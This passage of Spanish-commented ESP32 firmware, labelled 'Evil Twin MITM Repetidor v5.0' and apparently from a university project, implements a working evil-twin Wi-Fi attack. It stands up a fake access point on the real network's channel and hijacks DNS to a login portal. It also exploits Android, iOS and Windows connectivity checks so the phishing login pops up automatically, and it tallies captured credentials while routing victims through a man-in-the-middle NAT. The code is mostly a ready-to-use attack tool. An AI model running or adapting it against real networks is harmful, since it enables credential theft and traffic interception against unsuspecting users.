    server.send_P(200, "text/html; charset=UTF-8", HTML_EXITO);
  } else {
    handle_portal();
  }
}

// Android generate_204: un 302 al portal es el disparador mas fiable del popup
void handle_gen204() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

// iOS/macOS: en vez de "<Success>" servimos el PORTAL -> iOS abre la ventana
// automatica (Captive Network Assistant) mostrando directamente el login.
void handle_hotspot() {
  log_req();
  server.send_P(200, "text/html; charset=UTF-8", HTML_PORTAL);
}

void handle_ncsi() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

void handle_not_found() {
  log_req();
  send_redirect("http://192.168.4.1/");
}

// ============================================================================
// DNS PROPIO — secuestro (portal) o reenvio al DNS real (internet)
// ============================================================================

void dns_setup() {
  dnsUDP.begin(53);        // recibe consultas DNS de los clientes del AP
}

// Localiza el fin de la pregunta (tras QTYPE/QCLASS) y devuelve el dominio + tipo
int dns_fin_pregunta(byte* q, int qlen, String& dominio, int& qtype) {
  dominio = "";
  int i = 12;
  while (i < qlen && q[i] != 0) {
    int len = q[i]; i++;
    if (len <= 0 || i + len > qlen) return -1;
    if (dominio.length() > 0) dominio += ".";
    for (int j = 0; j < len; j++) dominio += (char)q[i + j];
    i += len;
  }
  if (i + 5 > qlen) return -1;          // 0x00 + QTYPE(2) + QCLASS(2)
  qtype = (q[i + 1] << 8) | q[i + 2];
  return i + 5;                          // indice de fin de la pregunta
}

// Construye y envia una respuesta DNS. Si con_ip, añade 1 registro A con 'ip'.
void dns_responder(IPAddress cip, uint16_t cport, byte* q, int qend, bool con_ip, IPAddress ip) {
  if (qend < 12 || qend > 500) return;
  static byte resp[512];
  memcpy(resp, q, qend);                 // cabecera + pregunta (sin EDNS/adicionales)
  resp[2] = 0x81; resp[3] = 0x80;        // flags: respuesta + RA
  resp[6] = 0x00; resp[7] = con_ip ? 1 : 0;  // ANCOUNT
  resp[8] = 0; resp[9] = 0; resp[10] = 0; resp[11] = 0;  // NSCOUNT/ARCOUNT = 0
  int i = qend;
  if (con_ip) {
    resp[i++] = 0xC0; resp[i++] = 0x0C;  // puntero al nombre de la pregunta
    resp[i++] = 0x00; resp[i++] = 0x01;  // tipo A
    resp[i++] = 0x00; resp[i++] = 0x01;  // clase IN
    resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x00; resp[i++] = 0x0A;  // TTL 10s (transicion rapida tras login)
    resp[i++] = 0x00; resp[i++] = 0x04;  // RDLENGTH 4
    resp[i++] = ip[0]; resp[i++] = ip[1]; resp[i++] = ip[2]; resp[i++] = ip[3];
  }
  dnsUDP.beginPacket(cip, cport);
  dnsUDP.write(resp, i);
  dnsUDP.endPacket();
}

// Dominios de comprobacion de conectividad del SO. En modo portal los
// resolvemos REAL para que el movil valide "internet OK" y NO se desconecte
// de la red (asi da tiempo a que se muestre el portal al navegar).
bool es_dominio_sonda(String d) {
  d.toLowerCase();
  static const char* probes[] = {
    // Dominios de comprobacion que resolvemos REAL para que Android no se
    // desconecte. NO incluimos los de Apple: asi el iPhone detecta el portal
    // por HTTP y abre el login automaticamente (iOS es fiable para esto).
    "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
    "www.msftconnecttest.com", "www.msftncsi.com"
  };
  for (unsigned i = 0; i < sizeof(probes) / sizeof(probes[0]); i++)
    if (d == probes[i]) return true;
  return false;
}

// Resuelve el dominio de verdad (cache o hostByName) y responde al cliente.
void dns_resolver_real(IPAddress cip, uint16_t cport, byte* q, int qend, const String& dominio, int qtype) {
  if (qtype != 1) { dns_responder(cip, cport, q, qend, false, IP_AP); return; }  // AAAA -> vacio
  IPAddress rip;
  if (dns_cache_buscar(dominio, rip)) { dns_responder(cip, cport, q, qend, true, rip); return; }
  if (WiFi.hostByName(dominio.c_str(), rip) == 1) {
    dns_cache_guardar(dominio, rip);
    dns_responder(cip, cport, q, qend, true, rip);
    Serial.print("[DNS] "); Serial.print(dominio); Serial.print(" -> "); Serial.println(rip);
  } else {
    dns_responder(cip, cport, q, qend, false, IP_AP);
  }
}

void dns_loop() {
  int len = dnsUDP.parsePacket();
  if (len <= 0) return;
  IPAddress cip = dnsUDP.remoteIP();
  uint16_t  cport = dnsUDP.remotePort();
  int n = dnsUDP.read(dnsbuf, sizeof(dnsbuf));
  if (n <= 0 || n > 500) return;
  static byte q[512];
  memcpy(q, dnsbuf, n);

  String dominio; int qtype = 0;
  int qend = dns_fin_pregunta(q, n, dominio, qtype);
  if (qend < 0) return;

  if (secuestro_dns) {
    if (es_dominio_sonda(dominio)) {
      // sonda del SO: resolver real -> el movil valida y NO se desconecta
      dns_resolver_real(cip, cport, q, qend, dominio, qtype);
    } else {
      // todo lo demas -> portal cautivo (192.168.4.1)
      dns_responder(cip, cport, q, qend, true, IP_AP);
    }
    return;
  }

  // Modo internet: resolvemos todo de verdad
  dns_resolver_real(cip, cport, q, qend, dominio, qtype);
}

// ============================================================================
// PUERTO 443: NO escuchamos a proposito. Asi el sondeo HTTPS de Android recibe
// "conexion rechazada" rapido y CAE al sondeo por HTTP (puerto 80), que si
// respondemos con el portal -> dispara el popup "Iniciar sesion". Si aceptamos
// y cerramos el 443, Android lo ve "roto" y NO cae a HTTP (no salta el portal).
// ============================================================================

// ============================================================================
// INICIALIZACIÓN AP + SERVIDOR
// ============================================================================

// Eventos del AP: saber si un cliente se asocia o se cae (con MAC y motivo)
void wifi_event(WiFiEvent_t ev, WiFiEventInfo_t info) {
  if (ev == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
    Serial.printf("[AP] Cliente ASOCIADO %02x:%02x:%02x:%02x:%02x:%02x\n",
      info.wifi_ap_staconnected.mac[0], info.wifi_ap_staconnected.mac[1],
      info.wifi_ap_staconnected.mac[2], info.wifi_ap_staconnected.mac[3],
      info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);
  } else if (ev == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
    Serial.printf("[AP] Cliente CAIDO %02x:%02x:%02x:%02x:%02x:%02x\n",
      info.wifi_ap_stadisconnected.mac[0], info.wifi_ap_stadisconnected.mac[1],
      info.wifi_ap_stadisconnected.mac[2], info.wifi_ap_stadisconnected.mac[3],
      info.wifi_ap_stadisconnected.mac[4], info.wifi_ap_stadisconnected.mac[5]);
  } else if (ev == ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED) {
    Serial.print("[AP] IP entregada a cliente: ");
    Serial.println(IPAddress(info.wifi_ap_staipassigned.ip.addr));
  }
}

void inicializar_ap() {
  WiFi.onEvent(wifi_event);
  WiFi.mode(WIFI_AP_STA);

  // El ESP32 tiene UNA sola radio: AP y STA comparten canal. Si el AP arranca
  // en canal 1 y el STA engancha la red real en otro canal, el AP SALTA de canal
  // y tira a los clientes. Solucion: arrancar el AP en el mismo canal que la red real.
  int canal = 1;
  Serial.println("[AP] Escaneando canal de la red real...");
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == String(SSID_REAL)) { canal = WiFi.channel(i); break; }
  }
  WiFi.scanDelete();
  Serial.print("[AP] Canal de "); Serial.print(SSID_REAL);
  Serial.print(" = "); Serial.println(canal);

  WiFi.softAPConfig(IP_AP, GW_AP, MASK_AP);
  WiFi.softAP(SSID_FAKE, PASS_FAKE, canal);   // AP en el MISMO canal -> sin salto
  t_inicio = millis();
  Serial.print("[AP] Red activa: " + String(SSID_FAKE));
  Serial.print("  IP: 192.168.4.1  canal AP: ");
  Serial.println(WiFi.channel());
}

void inicializar_servidor() {
  server.on("/",                          HTTP_GET,  handle_portal);
  server.on("/submit",                    HTTP_POST, handle_submit);

  // Android (todas las versiones)
  server.on("/generate_204",              HTTP_GET,  handle_gen204);
  server.on("/gen_204",                   HTTP_GET,  handle_gen204);
  server.on("/generate204",               HTTP_GET,  handle_gen204);

  // iOS / macOS
  server.on("/hotspot-detect.html",       HTTP_GET,  handle_hotspot);
  server.on("/library/test/success.html", HTTP_GET,  handle_hotspot);

  // Windows
  server.on("/ncsi.txt",                  HTTP_GET,  handle_ncsi);
  server.on("/connecttest.txt",           HTTP_GET,  handle_ncsi);
  server.on("/redirect",                  HTTP_GET,  handle_gen204);

  server.onNotFound(handle_not_found);
  server.begin();
  // 443 a proposito SIN escuchar (ver nota arriba): fuerza el fallback a HTTP.
  dns_setup();
  secuestro_dns = !ABRIR_INTERNET_AL_INICIO;   // arranca en modo portal (hijack)

  Serial.println("[HTTP]  Puerto 80 OK");
  Serial.println("[HTTPS] Puerto 443 TCP raw OK");
  Serial.print("[DNS]   Propio OK - modo: ");
  Serial.println(secuestro_dns ? "SECUESTRO (portal)" : "REENVIO (internet)");
}

// ============================================================================
// NAT — activa enrutamiento real AP → Internet
// ============================================================================

// Auto-test: el ESP resuelve un dominio con el resolvedor propio del sistema
// (independiente del socket dnsFwd) para saber si tiene internet real de verdad.
void test_internet_esp() {
  IPAddress res;
  int ok = WiFi.hostByName("google.com", res);
  if (ok == 1) {
    Serial.print("[TEST] ESP internet OK - google.com = "); Serial.println(res);
  } else {
    Serial.println("[TEST] ESP SIN internet (hostByName fallo) ✗");
  }
}

void habilitar_nat() {
  // IDF 5.x (core 3.x) usa TCPIP core-locking: hay que tomar el candado
  // del núcleo lwIP antes de llamar a ip_napt_enable() desde el hilo Arduino,
  // o dispara: assert sys_timeout "Required to lock TCPIP core functionality!"
  LOCK_TCPIP_CORE();
  ip_napt_enable((uint32_t)IP_AP, 1);
  UNLOCK_TCPIP_CORE();
  natActivo = true;
  Serial.println("[NAT] ACTIVO — AP → Internet enrutado");
  Serial.print("[NAT] IP STA: "); Serial.println(WiFi.localIP());
  Serial.print("[NAT] Canal (AP y STA comparten): "); Serial.println(WiFi.channel());
  test_internet_esp();
}

// ============================================================================
// MÁQUINA DE ESTADOS WIFI STA
// ============================================================================

void manejar_wifi_sta() {
  switch (estadoSTA) {

    case STA_PENDIENTE:
      Serial.println("[STA] Iniciando WiFi.begin()...");
      WiFi.begin(SSID_REAL, PASS_REAL);
      tInicioSTA = millis();
      estadoSTA  = STA_CONECTANDO;
      if (!natActivo) led_azul();
      break;

    case STA_CONECTANDO:
      if (WiFi.status() == WL_CONNECTED) {
        estadoSTA = STA_CONECTADO;
        Serial.print("[STA] Conectado: "); Serial.println(WiFi.localIP());
        Serial.print("[STA] RSSI: "); Serial.print(WiFi.RSSI()); Serial.println(" dBm");
        buzzer_ok();
        habilitar_nat();
        led_cyan();
      } else if (millis() - tInicioSTA > STA_TIMEOUT_MS) {
        Serial.println("[STA] Timeout. Reintentando...");
        WiFi.disconnect();
        tReintento = millis();
        estadoSTA  = STA_REINTENTANDO;
        led_verde();
      }
      break;

    case STA_CONECTADO:
      if (WiFi.status() != WL_CONNECTED) {
        Serial.println("[STA] Señal perdida, reconectando...");
        natActivo = false;
        estadoSTA = STA_PENDIENTE;
        led_verde();
      }
      break;

    case STA_REINTENTANDO:
      if (millis() - tReintento > STA_RETRY_MS) estadoSTA = STA_PENDIENTE;
      break;
  }
}

// ============================================================================
// STATUS
// ============================================================================

void mostrar_estado() {
  Serial.println("\n========== STATUS ==========");
  Serial.print("AP Fake : "); Serial.print(SSID_FAKE);
  Serial.print("  Clientes: "); Serial.println(WiFi.softAPgetStationNum());
  Serial.print("STA     : ");
  if (estadoSTA == STA_CONECTADO) {
    Serial.print("CONECTADO "); Serial.println(WiFi.localIP());
  } else if (estadoSTA == STA_CONECTANDO) {
    Serial.println("Conectando...");
  } else {
    Serial.println("Desconectado");
  }
  Serial.print("NAT     : "); Serial.println(natActivo ? "ACTIVO (MITM)" : "INACTIVO");
  Serial.print("Creds   : "); Serial.println(creds_count);
  Serial.print("Uptime  : "); Serial.print((millis() - t_inicio) / 1000); Serial.println("s");
  Serial.println("============================\n");
}

// ============================================================================
//  S E T U P
// ============================================================================

void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n\n=== Evil Twin MITM Repetidor v5.0 — UMSS San Simón ===\n");

  pinMode(BUZZER_PIN, OUTPUT);
  pinMode(LED_R_PIN,  OUTPUT);
  pinMode(LED_G_PIN,  OUTPUT);
  pinMode(LED_B_PIN,  OUTPUT);
  digitalWrite(BUZZER_PIN, LOW);
  led_apagar();

  inicializar_oled();
  inicializar_spiffs();
  inicializar_ap();
  inicializar_servidor();

  // LED verde inmediato — portal activo antes de que STA conecte
  led_verde();
  buzzer_beep(80); delay(80); buzzer_beep(80); delay(80); buzzer_beep(200);

  Serial.println("[OK] Portal activo: " + String(SSID_FAKE));
  Serial.println("[OK] WiFi.begin() arranca en loop() — sin bloqueos\n");
}

// ============================================================================
//  L O O P
// ============================================================================

unsigned long t_led    = 0;
unsigned long t_serial = 0;
unsigned long t_oled   = 0;

void loop() {
  server.handleClient();
  dns_loop();
  manejar_wifi_sta();
  gestionar_scan();       // lanza/recoge escaneos WiFi async

  // LED cada 2s
  if (millis() - t_led >= 2000) {
    t_led = millis();
    if      (creds_count > 0)           led_rojo();
    else if (natActivo)                  led_cyan();
    else if (WiFi.softAPgetStationNum()) led_amarillo();
    else                                 led_verde();
  }

  // OLED cada 1s (rotación de pantallas la controla gestionar_oled)
  if (millis() - t_oled >= 1000) {
    t_oled = millis();
    gestionar_oled();
  }

  // Status cada 15s + auto-test de internet del ESP (para diagnostico)
  if (millis() - t_serial >= 15000) {
    t_serial = millis();
    mostrar_estado();
    if (natActivo) test_internet_esp();
  }

  delay(5);
}
